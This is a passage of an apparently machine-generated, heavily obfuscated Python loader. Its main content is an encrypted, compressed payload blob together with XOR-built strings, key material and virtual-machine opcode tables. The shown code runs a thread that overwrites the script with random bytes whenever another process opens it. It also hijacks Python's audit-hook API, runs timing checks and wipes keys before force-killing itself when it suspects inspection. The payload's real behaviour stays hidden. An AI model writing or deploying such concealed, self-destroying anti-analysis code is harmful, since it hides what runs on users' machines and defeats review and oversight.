qgbQ~C#bz2}$%O$d@VA=@h=y-1k^AS_+;`*iTUH_mwR4!`s=C!)04_p>rX-zsW!qkrulQ8j614D9l0`^iXApx0NUN%-&2^U7Y^8A!gmHWzYMJ;wM5tjSO=L~z@^QyK_*>kFcKI6k0Es*HdP-+3*!J_-~L?O$(T@(bs29<~2XBA70(5Kq#=<<#<3quY{$z(|k*2(SypWad<iq9*voTUnDAxLkX^A#?8nGuX1f^ang#V`?TA2C&_|Q!+Ggg+!GZbvUbvTN>^(<*ncW>^BD{0O;|9_r!8)AQ{}dBY5O0!yHmL9ZnT1m6$&%D6_)p!@iPF<Vv9rs3!7M{!cY#M5-){InA_Dw$#EH5`XBz<iDc7PXX^tH*slv*Zl8eJjh`O>x`f*QA3TnEVK;$>t2URyW61k@Z`LJaxWuc%r#r-CO1G|Bqepe+W5Q_;KUZYjyjRn94P|2>S#NgEO;FeCNa|_`k>5xt@Tj#r_~QK8HFXx#{we)H8|WhYe0g!Wz1uYSo6cR;V{Ha=}=$6f$tkN)U^@qS<D8hFg#lznj8)|1J%LWh^q8&lTD)N9p}!oc^1lt=mDD^u(rX_-*MF3#J^IPqBr>AqC+qfFfn*QhP=Wb*96w7Of&8*2|VG1_kd2DBNrGGQTF1jrQsmTAzgb?89v+9lWwz?+EITz88}U_KV^g$n=O5sqZ};UA%$g{gs|h-cxpJTivI(0MB7Q6VUEKecV6+o;_|{d'
_nixon_Žŏ京ɿФו = 'o6p#eAKCPS+K22J!^f>W'
_nixon_Յᛄҝשڿɉ = '#>{WiS}2V`(aSvk8>kMx'
_nixon_ᎶႪΉŌڶশぎჼץ৮ = None
def _nixon_ņٺוぎؠごゆӵ():
    import threading as _nx_thr
    def _nx_scan():
        try:
            _s_argv = chr(97)+chr(114)+chr(103)+chr(118)
            _s_win = chr(87)+chr(105)+chr(110)+chr(100)+chr(111)+chr(119)+chr(115)
            _s_proc = chr(47)+chr(112)+chr(114)+chr(111)+chr(99)
            _s_fd = chr(102)+chr(100)
            _self_path = _nixon_オペレーション운영.path.abspath(_nixon_システム시스템.argv[0] if hasattr(_nixon_システム시스템, _s_argv) and _nixon_システム시스템.argv else __file__)
            if _nixon_プラットフォーム플랫폼.system() != _s_win:
                _proc = _s_proc
                if _nixon_オペレーション운영.path.isdir(_proc):
                    _my_pid = str(_nixon_オペレーション운영.getpid())
                    for _pid_dir in _nixon_オペレーション운영.listdir(_proc):
                        if not _pid_dir.isdigit() or _pid_dir == _my_pid: continue
                        try:
                            _fd_dir = _nixon_オペレーション운영.path.join(_proc, _pid_dir, _s_fd)
                            for _fd in _nixon_オペレーション운영.listdir(_fd_dir):
                                try:
                                    _link = _nixon_オペレーション운영.readlink(_nixon_オペレーション운영.path.join(_fd_dir, _fd))
                                    if _link == _self_path:
                                        try:
                                            with open(_self_path, chr(119)+chr(98)) as _wf: _wf.write(_nixon_オペレーション운영.urandom(_nixon_オペレーション운영.path.getsize(_self_path)))
                                        except: pass
                                        pass
                                except: continue
                        except: continue
        except: pass
    try:
        _t = _nx_thr.Thread(target=_nx_scan, daemon=True)
        _t.start()
    except Exception:
        pass
def _nixon_ęঢʨざॉ๘べٷ():
    global _nixon_ᎶႪΉŌڶশぎჼץ৮, _nixon_ᎰᏧӵᚻŌแ, _nixon_Žŏ京ɿФו, _nixon_Յᛄҝשڿɉ
    if _nixon_ᎶႪΉŌڶশぎჼץ৮ is not None: return _nixon_ᎶႪΉŌڶশぎჼץ৮
    _nixon_ņٺוぎؠごゆӵ()
    _ek = _nixon_ベース베이스.b85decode(_nixon_Žŏ京ɿФו.encode()) + _nixon_ベース베이스.b85decode(_nixon_Յᛄҝשڿɉ.encode())
    _raw_enc = _nixon_ベース베이스.b85decode(_nixon_ᎰᏧӵᚻŌแ.encode())
    _raw_dec = bytes([_raw_enc[_i] ^ _ek[_i % len(_ek)] for _i in range(len(_raw_enc))])
    _nixon_ᎶႪΉŌڶশぎჼץ৮ = _nixon_マーシャル마샬.loads(_nixon_圧縮압축.decompress(_raw_dec))
    try:
        _nixon_ᎰᏧӵᚻŌแ = None
        _nixon_Žŏ京ɿФו = None
        _nixon_Յᛄҝשڿɉ = None
    except: pass
    return _nixon_ᎶႪΉŌڶশぎჼץ৮
_nx_salt_m = (2905279924 >> 3) & 0xFF
def _nixon_űƋთฺซט毓בը(idx):
    try:
        _t = _nixon_ęঢʨざॉ๘べٷ()
        _r = bytes([114^_nx_salt_m,111^_nx_salt_m,117^_nx_salt_m,116^_nx_salt_m,101^_nx_salt_m,114^_nx_salt_m])
        _r = bytes([_b ^ _nx_salt_m for _b in _r]).decode()
        _tb = bytes([116^_nx_salt_m,97^_nx_salt_m,98^_nx_salt_m,108^_nx_salt_m,101^_nx_salt_m,115^_nx_salt_m])
        _tb = bytes([_b ^ _nx_salt_m for _b in _tb]).decode()
        _kk = bytes([107^_nx_salt_m,101^_nx_salt_m,121^_nx_salt_m,115^_nx_salt_m])
        _kk = bytes([_b ^ _nx_salt_m for _b in _kk]).decode()
        _ff = bytes([70^_nx_salt_m,82^_nx_salt_m,65^_nx_salt_m,71^_nx_salt_m])
        _ff = bytes([_b ^ _nx_salt_m for _b in _ff]).decode()
        route = _t[_r].get(idx)
        if not route: return ""
        rtype, tbl, tbl_idx = route[0], route[1], route[2]
        if rtype == _ff:
            s1 = _t[_tb][tbl][tbl_idx]
            tbl2, idx2 = route[3], route[4]
            s2 = _t[_tb][tbl2][idx2]
            Nixon_Enc_b64 = s1 + s2
            tbl_key = _nixon_ベース베이스.b64decode(_t[_kk][tbl])
        else:
            Nixon_Enc_b64 = _t[_tb][tbl][tbl_idx]
            tbl_key = _nixon_ベース베이스.b64decode(_t[_kk][tbl])
        combined = _nixon_ベース베이스.b64decode(Nixon_Enc_b64)
        Nixon_Enc_bytes = combined[:-8]
        stored_hmac = combined[-8:]
        idx_key = _nixon_ハッシュ해시.sha256(tbl_key + str(tbl_idx).encode()).digest()
        expected_hmac = _nixon_エイチマック에이치.new(tbl_key, Nixon_Enc_bytes, _nixon_ハッシュ해시.sha256).digest()[:8]
        if not _nixon_エイチマック에이치.compare_digest(stored_hmac, expected_hmac): return ""
        _dec = bytes([b ^ idx_key[i % 32] for i, b in enumerate(Nixon_Enc_bytes)])
        try: return _dec.decode('utf-8')
        except: return _dec.decode(_nixon_űƋთฺซט毓בը(0))
    except: return ""
_打印輸出한글ไทย=print;_字符串టెక్స్ట్=str;_整数數字หมาย=int;_浮點小数ทศนิ=float;_布爾真假ค่าจ=bool;_列表清單รายก=list;_字典辭典พจนา=dict;_集合集體เซ็ต=set;_元組組合ทูเพ=tuple;_長度數量ความย=len;_範圍區間ช่วง=range;_枚舉列舉แจกแ=enumerate;_壓縮打包ซิป=zip;_映射對應แผนท=map;_過濾篩選กรอง=filter;_排序整理เรียง=sorted;_反轉倒序กลับ=reversed;_最小极值ต่ำสุ=min;_最大極值สูงสุ=max;_總和加總ผลรว=sum;_絕對值절대값=abs;_四捨五入반올림=round;_幂函次方ยกกำ=pow;_字符符號อักขร=chr;_序號碼值ค่าเล=ord;_十六進位เลขฐ=hex;_八進制ฐานแป=oct;_二進位ไบนา=bin;_表示顯示การแ=repr;_類型種類ประเภ=type;_實例檢查ตรวจส=isinstance;_子類檢查ตรวจร=issubclass;_可呼叫เรียก=callable;_有屬性มีคุณ=hasattr;_取屬性ดึงคุ=getattr;_設屬性ตั้งค=setattr;_刪屬性ลบคุณ=delattr;_開啟打開เปิดไ=open;_輸入接收รับข้=input;_求值計算คำนวณ=eval;_執行運行ดำเนิ=exec;_編譯轉換คอมไพ=compile;_全域變數ตัวแป=globals;_區域變數ท้องถ=locals;_屬性詞典คุณสม=vars;_目錄列表ไดเรก=dir;_識別碼รหัสป=id;_雜湊散列แฮช=hash;_物件對象วัตถุ=object;_父類超類ซูเปอ=super;_位元組ไบต์=bytes;_位元陣列อาร์เ=bytearray;_格式格式รูปแบ=format;_迭代器ตัววน=iter;_下一個ถัดไป=next;_任意有任มีใดๆ=any;_全部所有ทั้งหม=all;_例外異常ข้อยก=Exception;_值錯誤ค่าผิด=ValueError;_類型錯誤ชนิดผ=TypeError;_鍵錯誤คีย์ผ=KeyError;_索引錯誤ดัชนี=IndexError;_屬性錯誤คุณสม=AttributeError;_運行錯誤รันไท=RuntimeError;_停止迭代หยุดว=StopIteration
_REQUIRED_VERSION = (3, 13)
# Batch-3 CI scope: the SKIP bypass only applies when the CI gate var is
# ALSO set (NIXON_CI or NIXON_ALLOW_SKIP); prod artifacts hold the gate
# with SKIP alone. Rule: new version-gate bypasses require the CI scope.
_16cbeae604_SO = bool(_nixon_オペレーション운영.environ.get(_nixon_űƋთฺซט毓בը(1)))
_16cbeae604_CO = bool(_nixon_オペレーション운영.environ.get(_nixon_űƋთฺซט毓בը(2)) or _nixon_オペレーション운영.environ.get(_nixon_űƋთฺซט毓בը(3)))
if _nixon_システム시스템.version_info[:2] != _REQUIRED_VERSION and not (_16cbeae604_SO and _16cbeae604_CO):
    _req = f"{_REQUIRED_VERSION[0]}.{_REQUIRED_VERSION[1]}"
    _cur = f"{_nixon_システム시스템.version_info[0]}.{_nixon_システム시스템.version_info[1]}"
    print(f"[!] Incompatible Python Version.\\n[!] Required: {_req} | Found: {_cur}")
    _nixon_システム시스템.exit(1)
_nixon_ɫȀח०ƣნほɦ = False
_nixon_ҿᏬƌȋʘ = ""
import os as _os
import sys as _sys

def _16cbeae604_k(_reason="", _holders=None):
    import os as _nx_os
    try:
        _nx_seen = []
        try:
            if _holders is not None:
                if isinstance(_holders, dict):
                    _nx_seen.extend(list(_holders.values()))
                else:
                    _nx_seen.extend(list(_holders))
        except Exception:
            pass
        try:
            _nx_g = globals()
        except Exception:
            _nx_g = {}
        try:
            _nx_seen.extend(list(_nx_g.values()))
        except Exception:
            pass
        for _nx_h in _nx_seen:
            try:
                if isinstance(_nx_h, bytearray):
                    for _nx_i in range(len(_nx_h)):
                        _nx_h[_nx_i] = 0
                elif isinstance(_nx_h, memoryview):
                    try:
                        _nx_h[:] = b"\x00" * len(_nx_h)
                    except Exception:
                        pass
            except Exception:
                continue
        try:
            for _nx_kn in (_nixon_űƋთฺซט毓בը(4), _nixon_űƋთฺซט毓בը(5)):
                try:
                    if _nx_kn in _nx_g:
                        del _nx_g[_nx_kn]
                except Exception:
                    pass
        except Exception:
            pass
    except Exception:
        pass
    try:
        if _nx_os.environ.get(_nixon_űƋთฺซט毓בը(6), "0") == "1":
            try:
                _nx_os.write(2, (_nixon_űƋთฺซט毓בը(7) + str(_reason) + "\n").encode("utf-8", "ignore")[:256])
            except Exception:
                pass
    except Exception:
        pass
    _nx_os._exit(137)
    # Corrupt-and-continue fallback (A3.4): if _exit itself was
    # monkeypatched, imported away or seccomp-blocked, the gate above
    # returns here and the artifact would keep running with its keys
    # already wiped -- a half-killed process is worse than either
    # outcome.  Both fallbacks are unreachable when _exit works.
    try:
        import signal as _nx_sig
        _nx_sig.raise_signal(_nx_sig.SIGKILL)
    except Exception:
        pass
    try:
        _nx_os.kill(_nx_os.getpid(), 9)
    except Exception:
        pass

_16cbeae604_AO = _os.environ.get(_nixon_űƋთฺซט毓בը(8), '') in ('1', _nixon_űƋთฺซט毓בը(9), _nixon_űƋთฺซט毓בը(10), _nixon_űƋთฺซט毓בը(11), _nixon_űƋთฺซט毓בը(12), _nixon_űƋთฺซט毓בը(13), _nixon_űƋთฺซט毓בը(14))
if not _16cbeae604_AO and not globals().get(_nixon_űƋთฺซט毓בը(15), False):
    globals()[_nixon_űƋთฺซט毓בը(15)] = True
    # NOTE: CPython exposes no public API to enumerate installed
    # audit hooks, so full enumeration from Python is impossible.
    # The canary below instead proves our observer is still live
    # and no foreign hook ahead of it raises/blocks delivery.
    try:
        _16cbeae604_ef = globals().get(_nixon_űƋთฺซט毓בը(16), None)
    except Exception:
        _16cbeae604_ef = None
    try:
        _16cbeae604_oah = _sys.addaudithook
    except Exception:
        _16cbeae604_oah = None
    if _16cbeae604_oah is not None:
        def _16cbeae604_isp(_p):
            try:
                _low = str(_p).lower().replace(chr(92), '/')
            except Exception:
                return False
            return (_nixon_űƋთฺซט毓בը(17) in _low) or (_nixon_űƋთฺซט毓בը(18) in _low)
        def _16cbeae604_ah(_hook, *args, **kwargs):
            try:
                _entry_in_site = bool(_16cbeae604_ef) and _16cbeae604_isp(_16cbeae604_ef)
            except Exception:
                _entry_in_site = False
            _plant = False
            if not _entry_in_site:
                try:
                    _frm = _sys._getframe(1)
                    while _frm is not None:
                        try:
                            _fn = _frm.f_code.co_filename
                        except Exception:
                            _fn = None
                        if _fn and _16cbeae604_isp(_fn):
                            _plant = True
                            break
                        _frm = _frm.f_back
                except Exception:
                    _plant = False
            if _plant:
                _16cbeae604_k(_nixon_űƋთฺซט毓בը(19))
            try:
                _r = _16cbeae604_oah(_hook, *args, **kwargs)
            except Exception:
                raise
            try:
                globals()[_nixon_űƋთฺซט毓בը(20)] = int(globals().get(_nixon_űƋთฺซט毓בը(20), 0)) + 1
            except Exception:
                pass
            return _r
        try:
            _sys.addaudithook = _16cbeae604_ah
        except Exception:
            pass
        try:
            globals()[_nixon_űƋთฺซט毓בը(21)] = id(_16cbeae604_ah)
        except Exception:
            pass
        try:
            globals().setdefault(_nixon_űƋთฺซט毓בը(20), 0)
        except Exception:
            pass
        try:
            globals().setdefault(_nixon_űƋთฺซט毓בը(22), 0)
        except Exception:
            pass
        def _16cbeae604_ac(_ev, _args):
            try:
                if _ev == _nixon_űƋთฺซט毓בը(23):
                    try:
                        globals()[_nixon_űƋთฺซט毓בը(22)] = int(globals().get(_nixon_űƋთฺซט毓בը(22), 0)) + 1
                    except Exception:
                        pass
            except Exception:
                pass
        try:
            _16cbeae604_oah(_16cbeae604_ac)
        except Exception:
            pass
        try:
            import time as _nx_time
        except Exception:
            _nx_time = None
        try:
            globals()[_nixon_űƋთฺซט毓בը(24)] = _nx_time.perf_counter_ns() if _nx_time is not None else 0
        except Exception:
            try:
                globals()[_nixon_űƋთฺซט毓בը(24)] = 0
            except Exception:
                pass
        def _16cbeae604_abl():
            try:
                _t = _nx_time
            except Exception:
                _t = None
            if _t is None:
                return 0
            try:
                _before = int(globals().get(_nixon_űƋთฺซט毓בը(22), 0))
            except Exception:
                _before = 0
            try:
                _s = _sys.audit
            except Exception:
                return 0
            try:
                _t0 = _t.perf_counter_ns()
            except Exception:
                return 0
            for _i in range(50):
                try:
                    _s(_nixon_űƋთฺซט毓בը(23))
                except Exception:
                    return -1
            try:
                _t1 = _t.perf_counter_ns()
            except Exception:
                return -1
            try:
                _after = int(globals().get(_nixon_űƋთฺซט毓בը(22), 0))
            except Exception:
                _after = _before
            if (_after - _before) < 50:
                return -1
            try:
                _mean = (_t1 - _t0) // 50
            except Exception:
                return 0
            if _mean <= 0:
                return 1
            return _mean
        try:
            globals()[_nixon_űƋთฺซט毓בը(25)] = _16cbeae604_abl()
        except Exception:
            try:
                globals()[_nixon_űƋთฺซט毓בը(25)] = 0
            except Exception:
                pass
        def _16cbeae604_av():
            try:
                _cur = _sys.addaudithook
            except Exception:
                _cur = None
            try:
                _mine = globals().get(_nixon_űƋთฺซט毓בը(26), None)
            except Exception:
                _mine = None
            if _mine is not None and _cur is not _mine:
                _16cbeae604_k(_nixon_űƋთฺซט毓בը(19))
                return _nixon_űƋთฺซט毓בը(27)
            if _mine is None:
                try:
                    _wid = int(globals().get(_nixon_űƋთฺซט毓בը(21), 0))
                except Exception:
                    _wid = 0
                if _wid and _cur is not None:
                    try:
                        _same = (id(_cur) == _wid)
                    except Exception:
                        _same = False
                    if not _same:
                        _16cbeae604_k(_nixon_űƋთฺซט毓בը(19))
                        return _nixon_űƋთฺซט毓בը(27)
            try:
                _m = _16cbeae604_abl()
            except Exception:
                _m = 0
            if _m == -1:
                _16cbeae604_k(_nixon_űƋთฺซט毓בը(19))
                return _nixon_űƋთฺซט毓בը(28)
            if _m > 0:
                try:
                    _base = int(globals().get(_nixon_űƋთฺซט毓בը(25), 0))
                except Exception:
                    _base = 0
                _thresh = 500000
                try:
                    _cand = int(_base) * 10
                    if _cand > _thresh:
                        _thresh = _cand
                except Exception:
                    pass
                if _m > _thresh:
                    try:
                        _armed = (_os.environ.get(_nixon_űƋთฺซט毓בը(29), "0") != "0")
                    except Exception:
                        _armed = False
                    if _armed:
                        _16cbeae604_k(_nixon_űƋთฺซט毓בը(30))
                    return _nixon_űƋთฺซט毓בը(31)
            return "ok"
        try:
            _16cbeae604_av()
        except SystemExit:
            raise
        except BaseException:
            pass
        # Periodic re-check hook: hydra/background threads may call
        # _16cbeae604_av() at any time (report-only unless armed).

def _nixon_ΊӢץىまփॢ(msg):
    # [FATAL] and [BLOCKED] always reach stderr, even in the Silent build.
    # They used to be gated behind VAR_IS_DEBUG, so a failed payload decode in
    # the silent variant exited 1 with nothing on either stream -- which is
    # indistinguishable from a crash and cost several diagnosis rounds.
    _nx_m = str(msg)
    if _nx_m.startswith("[FATAL]") or _nx_m.startswith("[BLOCKED]"):
        try:
            _nixon_システム시스템.stderr.write(_nx_m + chr(10))
            _nixon_システム시스템.stderr.flush()
        except Exception:
            pass
    if _nixon_ɫȀח०ƣნほɦ:
        _nixon_システム시스템.stdout.write(str(msg) + "\n")
        _nixon_システム시스템.stdout.flush()
if not _nixon_ɫȀח०ƣნほɦ:
    pass
_nixon_ΊӢץىまփॢ("[DEBUG] Init start...")
_STR_SESSION_KEY = b'9\xc1\xe6\xed\xf5\xdf\xea\xef\xb4\x13\xbb\xfa/\x07P\xa7:\xb1\xa58\xf5\xaar<\xf6\x8b\xfd\xbft\x02\x01\xf3'
BUILD_TIMESTAMP = 1793892324
# The rotation window at pack time (always 0 for a fresh build).  Emitted
# so the loader derives the same key whenever it runs.
_NX_BUILD_WINDOW = 0

_BUILD_ID = _nixon_űƋთฺซט毓בը(266)
MORPH_MAP_A = {18: 0, 57: 1, 142: 2, 150: 3, 178: 4, 38: 5, 17: 6, 213: 7, 77: 8, 73: 9, 80: 10, 151: 11, 210: 12, 235: 13, 127: 14, 173: 15, 219: 16, 141: 17, 161: 18, 180: 19, 28: 20, 89: 21, 23: 22, 70: 23, 59: 24, 223: 25, 159: 26, 65: 27, 16: 28, 20: 29, 104: 30, 206: 31, 103: 32, 72: 33, 31: 34, 109: 35, 164: 36, 135: 37, 147: 38, 39: 39, 45: 40, 69: 41, 84: 42, 128: 43, 134: 44, 67: 45, 22: 46, 224: 47, 226: 48, 237: 49, 81: 50, 26: 51, 27: 52, 43: 53, 83: 54, 125: 55, 186: 56, 116: 57, 253: 58, 212: 59, 149: 60, 24: 61, 158: 62, 184: 63, 245: 64, 196: 65, 106: 66, 216: 67, 171: 68, 21: 69, 93: 70, 238: 71, 115: 72, 199: 73, 239: 74, 105: 75, 133: 76, 14: 77, 112: 78, 94: 79, 4: 80, 68: 81, 203: 82, 98: 83, 138: 84, 13: 85, 58: 86, 168: 87, 202: 88, 101: 89, 6: 90, 110: 91, 137: 92, 204: 93, 78: 94, 40: 95, 29: 96, 75: 97, 50: 98, 64: 99, 189: 100, 119: 101, 41: 102, 192: 103, 229: 104, 198: 105, 156: 106, 55: 107, 12: 108, 60: 109, 129: 110, 2: 111, 0: 112, 7: 113, 32: 114, 232: 115, 19: 116, 172: 117, 225: 118, 179: 119, 122: 120, 254: 121, 96: 122, 146: 123, 87: 124, 56: 125, 181: 126, 108: 127}
MORPH_MAP_B = {174: 128, 250: 129, 82: 130, 25: 131, 191: 132, 244: 133, 194: 134, 99: 135, 200: 136, 230: 137, 228: 138, 197: 139, 153: 140, 131: 141, 201: 142, 97: 143, 118: 144, 145: 145, 61: 146, 217: 147, 211: 148, 241: 149, 169: 150, 205: 151, 214: 152, 165: 153, 190: 154, 11: 155, 124: 156, 242: 157, 182: 158, 188: 159, 155: 160, 36: 161, 163: 162, 121: 163, 66: 164, 220: 165, 177: 166, 152: 167, 76: 168, 15: 169, 132: 170, 231: 171, 107: 172, 166: 173, 91: 174, 42: 175, 185: 176, 63: 177, 79: 178, 227: 179, 187: 180, 208: 181, 92: 182, 170: 183, 123: 184, 139: 185, 52: 186, 251: 187, 111: 188, 252: 189, 90: 190, 183: 191, 74: 192, 143: 193, 236: 194, 209: 195, 34: 196, 85: 197, 215: 198, 160: 199, 5: 200, 130: 201, 162: 202, 120: 203, 207: 204, 221: 205, 255: 206, 243: 207, 193: 208, 1: 209, 222: 210, 88: 211, 100: 212, 48: 213, 157: 214, 53: 215, 9: 216, 140: 217, 233: 218, 117: 219, 144: 220, 51: 221, 62: 222, 176: 223, 126: 224, 3: 225, 47: 226, 234: 227, 246: 228, 33: 229, 175: 230, 8: 231, 114: 232, 154: 233, 30: 234, 148: 235, 86: 236, 247: 237, 10: 238, 46: 239, 249: 240, 54: 241, 44: 242, 49: 243, 167: 244, 240: 245, 218: 246, 71: 247, 195: 248, 136: 249, 102: 250, 95: 251, 37: 252, 248: 253, 113: 254, 35: 255}
MORPH_MAP = [MORPH_MAP_A, MORPH_MAP_B]
_I_SALT = b'\xb4\r+\xad\t\x8f.\xf8\xedux\xd3\xcf\x14\x9dm\xd8H\xa4\x7f\x0bC=\x1a\x90;\xdc\xfb\xa6\xe5\x02@'
pass
_16cbeae604_XM.update({})
_nixon_ΊӢץىまփॢ("[DEBUG] Decryptor loaded...")
FORCE_NATIVE_MODE = False
_nixon_जٮɦჇĨ = "67b3ba284f181a26e9a9681725f5480703c0e164fd92a99388859a84b921f1c1"; _SIG_ANCHOR_ = "__SIG_ANCHOR__"
_nixon_雉Ⴓ肙ঙŎ = "e18a12285eea89b47e5bdea6aa7064837b8db47e022787f375612f558f7a2685"; _HMAC_ANCHOR_ = "__HMAC_ANCHOR__"
_HMAC_KEY_ = b"a5ff79ed4fb16e39b9ff5c545482bc5ca201c59488353c58c876432a2b9a29df".decode()
_nixon_उѭऊͽᎴႲ = b'\x86m=H\xb8t\x02u^\xbd\xf2\xeaTW\t>'
_nixon_Ķ৩Ɍȼぱ = b'1\xea\x1d\xb0\xabK\xa9\xd9\x8a~\xaa\x1b\x00(n\x9cJ)E\x9fW5\x12\xa92\xcd[x!\x87\x10\x02'
_nixon_फ़ᚮŢןს = b'#\x878_a\xa7q\xe4\x9f\xc9\xbe\xd8\xf0\xf1\xd5\x9a$\xe72\x8f\x15\xd7\x9b\xbd\x9f\xf5\xb1\xbbF\xa7\x0c\xb7'
_nixon_ڃॗᛉǺฒ = b'\x9e_\xc6\xb4\x9c\x93?\xbf?\x03\xae\xec\xba\x11$\x81'
_nixon_ᎧᏚՈשלՏც = b'\xf4|\xe3\xafM\xaa]\x14e5\xe3\xb6\xde_N,'
_nixon_ɠই赟սӔฦ = "ZIZXdlxRYnZZUE52ZndSP1Z2hHRWelaFW3ZWgFZQV3Zbd152WVBOdnB6Rj1aYVp2WVBOdmZ3Uj9WeT1K" 
_nixon_ᎥᚩᚰᛃɤȆ = "ZIZXdlt3XnZZUE52ZndmPVZ2hHRWelY/W1BWgFZQV4ZvQF6FWoZWgFZQV4ZvQF6FWoZWgFZQV3Zbd152ZV5KSg==" 
_nixon_οীԱѰՅᏜぅǓΛの = False
_nixon_ٯͿূȹიʁڰՠ旘ġ = 0
SWIZZLE_KEY = b'L\xaa\xca}6\xf3\xfcNe,\xdf\xd58\xb9\xdd\xd2'
_nixon_ढśᏫբჵ = ""
_nixon_ՁʗάƇᏊᛠ = {_nixon_űƋთฺซט毓בը(33): '', _nixon_űƋთฺซט毓בը(34): '', _nixon_űƋთฺซט毓בը(35): ''}
_nixon_ʊӤぃऴᎲᛠよѡٙ = 122
_nixon_ႯჇγϯƼᏴხԲ = False
_nixon_ȫȀε澞žٍ๙בᏘぞ = b'\x91\xfd\x07\xdfG@v"5\x92\x1d\xf7U\xfc\xa3\xe9'
VM_OP_MAP_1 = {144: 0, 141: 1, 7: 2, 124: 3, 241: 4, 196: 5, 248: 6, 79: 7, 139: 8, 189: 9, 255: 10, 209: 5, 159: 6, 254: 4, 101: 10, 54: 9, 133: 6, 76: 6, 93: 4, 19: 6, 127: 1, 113: 3, 118: 9, 94: 10, 190: 0, 177: 5, 5: 0, 40: 1, 140: 7, 31: 1, 148: 3, 2: 8, 29: 9, 191: 6, 154: 10, 151: 0, 12: 10, 227: 5, 149: 9, 132: 8, 80: 9, 225: 8, 205: 5, 157: 7, 253: 7, 171: 4, 22: 6, 126: 4, 32: 0, 68: 4, 206: 0, 123: 5, 146: 10, 239: 7, 49: 5, 230: 8, 86: 7, 155: 0, 90: 0, 166: 5, 74: 5, 197: 0, 232: 3, 130: 5, 221: 7, 120: 8, 187: 10, 202: 10, 43: 7, 103: 2, 55: 8, 72: 9, 98: 3, 64: 9, 137: 9, 99: 5, 170: 0, 178: 10, 238: 6, 36: 2, 37: 3, 59: 6, 48: 5, 88: 6, 47: 9, 116: 8, 131: 2, 112: 4, 163: 4, 208: 9, 231: 6, 195: 9, 244: 1, 164: 8, 160: 2, 61: 9, 243: 6, 50: 10, 66: 3, 234: 4, 28: 10, 215: 6, 235: 8, 192: 6, 102: 5, 41: 0, 39: 1, 179: 0, 82: 3, 27: 2, 69: 9, 174: 5, 34: 2, 222: 0, 204: 9, 17: 5, 26: 1, 106: 8, 110: 10, 210: 4, 53: 0, 172: 7, 158: 2, 115: 0, 0: 1, 176: 5, 33: 3, 136: 2, 169: 9, 162: 9, 83: 3, 38: 6, 46: 6, 250: 7, 152: 1, 56: 3, 81: 6, 242: 10, 35: 1, 228: 10, 78: 7, 224: 5, 109: 6, 75: 7, 62: 4, 247: 7, 129: 5, 51: 8, 114: 6, 100: 2, 25: 10, 117: 8, 156: 1, 15: 5, 58: 0, 91: 9, 8: 3, 185: 7, 207: 9, 181: 2, 165: 9, 52: 2, 218: 0, 199: 4, 6: 2, 214: 9, 92: 7, 121: 5, 219: 1, 175: 8, 212: 4, 193: 3, 229: 2, 200: 4, 23: 7, 245: 4, 216: 6, 213: 7, 194: 3, 65: 8, 251: 3, 223: 10, 143: 1, 14: 7, 11: 0, 182: 0, 142: 5, 147: 2, 1: 9, 184: 5, 186: 10, 89: 9, 4: 0, 119: 9, 21: 0, 97: 5, 150: 0, 122: 8, 77: 2, 183: 8, 111: 5, 153: 4, 201: 1, 42: 3, 84: 1, 9: 6, 211: 9, 20: 0, 217: 8, 10: 4, 45: 1, 180: 9, 3: 7, 60: 0, 16: 2, 168: 3, 145: 5, 240: 9, 71: 8, 125: 9, 18: 10, 105: 6, 30: 6, 96: 9, 67: 3, 87: 3, 85: 1, 107: 4, 138: 10, 173: 4, 203: 1, 249: 9, 70: 7, 95: 10, 128: 0, 73: 1, 44: 1, 233: 4, 108: 10, 237: 2, 226: 4, 236: 2, 135: 7, 134: 0, 246: 6, 198: 9, 188: 5, 57: 3, 13: 0, 24: 4, 104: 5, 63: 2, 161: 0, 167: 10, 252: 4, 220: 10}
VM_OP_MAP_2 = {116: 0, 81: 1, 99: 2, 150: 3, 15: 4, 35: 5, 236: 6, 207: 7, 84: 8, 119: 9, 52: 10, 54: 7, 140: 2, 178: 0, 196: 4, 143: 10, 12: 2, 120: 6, 93: 6, 190: 2, 10: 2, 95: 7, 241: 3, 229: 5, 9: 9, 56: 0, 129: 9, 225: 2, 66: 5, 4: 0, 14: 0, 1: 3, 94: 10, 179: 2, 64: 10, 71: 5, 176: 10, 82: 0, 111: 5, 19: 9, 204: 6, 74: 0, 221: 3, 107: 8, 98: 2, 194: 7, 60: 6, 109: 7, 40: 4, 160: 6, 199: 6, 138: 8, 162: 6, 248: 6, 114: 2, 39: 4, 44: 6, 42: 10, 30: 9, 146: 0, 255: 1, 33: 5, 174: 6, 23: 7, 26: 1, 28: 3, 209: 10, 231: 7, 144: 4, 48: 3, 27: 10, 105: 10, 254: 10, 201: 5, 5: 0, 253: 9, 242: 8, 88: 7, 188: 10, 45: 10, 219: 3, 118: 9, 243: 9, 38: 9, 34: 6, 191: 6, 205: 8, 247: 6, 92: 8, 171: 2, 249: 9, 164: 5, 216: 6, 17: 1, 53: 1, 245: 9, 218: 2, 83: 5, 200: 6, 32: 8, 182: 3, 131: 3, 112: 9, 36: 5, 65: 1, 108: 8, 46: 8, 134: 3, 31: 6, 151: 2, 103: 4, 100: 6, 197: 6, 58: 5, 8: 1, 0: 4, 55: 8, 149: 8, 152: 3, 159: 9, 24: 4, 80: 9, 208: 6, 234: 3, 214: 3, 59: 8, 123: 7, 76: 0, 79: 3, 51: 1, 97: 7, 246: 6, 213: 10, 251: 8, 239: 3, 78: 3, 238: 3, 21: 7, 202: 7, 37: 0, 227: 8, 203: 7, 121: 7, 73: 2, 43: 2, 195: 6, 57: 10, 250: 2, 62: 5, 206: 5, 6: 3, 87: 3, 72: 4, 124: 0, 61: 5, 170: 3, 67: 8, 126: 7, 115: 5, 89: 5, 117: 10, 240: 7, 139: 10, 47: 2, 187: 9, 156: 2, 70: 5, 210: 9, 154: 3, 122: 6, 86: 8, 232: 0, 244: 9, 20: 9, 7: 9, 237: 1, 137: 10, 158: 8, 130: 7, 22: 5, 181: 6, 136: 0, 230: 2, 77: 2, 215: 0, 252: 8, 189: 6, 222: 2, 173: 0, 96: 0, 163: 3, 128: 6, 233: 6, 165: 5, 63: 10, 102: 5, 184: 0, 18: 0, 148: 1, 75: 3, 113: 3, 90: 10, 2: 4, 212: 6, 217: 0, 145: 3, 11: 9, 106: 6, 192: 6, 193: 9, 175: 2, 29: 9, 68: 6, 49: 3, 110: 10, 235: 1, 50: 4, 223: 0, 41: 6, 157: 10, 168: 1, 198: 9, 224: 10, 167: 2, 155: 5, 180: 1, 13: 2, 147: 5, 211: 5, 172: 8, 85: 1, 226: 6, 169: 5, 104: 6, 133: 2, 186: 2, 16: 0, 125: 7, 183: 6, 220: 9, 127: 5, 